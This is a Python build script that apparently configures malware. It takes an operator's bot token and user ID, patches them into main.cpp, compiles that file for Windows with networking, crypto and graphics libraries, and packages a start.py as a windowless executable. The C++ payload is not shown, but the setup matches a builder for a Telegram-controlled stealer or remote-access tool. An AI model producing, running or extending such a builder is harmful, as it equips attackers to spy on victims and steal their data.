import os
import subprocess
import time

# Function to request user input
def get_user_input(prompt):
    return input(prompt).strip()

# Function to check for the presence of g++
def check_gplusplus():
    try:
        subprocess.run(["g++", "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return True
    except FileNotFoundError:
        return False
    
def check_and_install_pyinstaller():
    try:
        subprocess.run(["pyinstaller", "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except FileNotFoundError:
        print("PyInstaller not found. Installing PyInstaller...")
        os.system("pip install pyinstaller")

# Function to print ASCII art
def print_ascii_art():
    ascii_art = """
db    db  .d8b.  d8888b. d888888b d8888b.  .d88b.  
`8b  d8' d8' `8b 88  `8D `~~88~~' 88  `8D .8P  88. 
 `8bd8'  88ooo88 88oobY'    88    88   88 88  d'88 
 .dPYb.  88~~~88 88`8b      88    88   88 88 d' 88 
.8P  Y8. 88   88 88 `88.    88    88  .8D `88  d8' 
YP    YP YP   YP 88   YD    YP    Y8888D'  `Y88P'  
                                                                                                                        
"""
    print(ascii_art)


def compile_animation():
    animation_frames = ["Compiling   ", "Compiling.  ", "Compiling.. ", "Compiling..."]
    for frame in animation_frames:
        print("\r" + frame, end="", flush=True)
        time.sleep(0.5)


if __name__ == "__main__":
    print_ascii_art()
    
    if not check_gplusplus():
        print("The g++ compiler was not found on your computer.")
        print("Please install g++ to compile the program.")
        exit(1)

    check_and_install_pyinstaller()

    user_id = get_user_input("Enter your user_id: ")
    bot_token = get_user_input("Enter your bot_token: ")

    build_option = get_user_input("Do you want to perform the build (Y/N): ")

    if build_option.lower() == "y":
        compile_animation()
        with open("main.cpp", "r") as file:
            file_data = file.read()
            file_data = file_data.replace('std::wstring g_botToken = L"100";',
                                          f'std::wstring g_botToken = L"{bot_token}";')
            file_data = file_data.replace('long int g_UserIdLong = 100;',
                                          f'long int g_UserIdLong = {user_id};')

        with open("main.cpp", "w") as file:
            file.write(file_data)

        os.system("g++ main.cpp -o output/main -lwininet -lshlwapi -lcrypt32 -lgdi32")
        os.system("pyinstaller --noconfirm --onefile --windowed 'start.py'")

        print("\nBuild completed successfully.")
        print("\nUPD: Warnings and notes when compiling are fine.")
        print("\nBoth files were compiled in the output folder.")
    else:
        print("Build not performed.")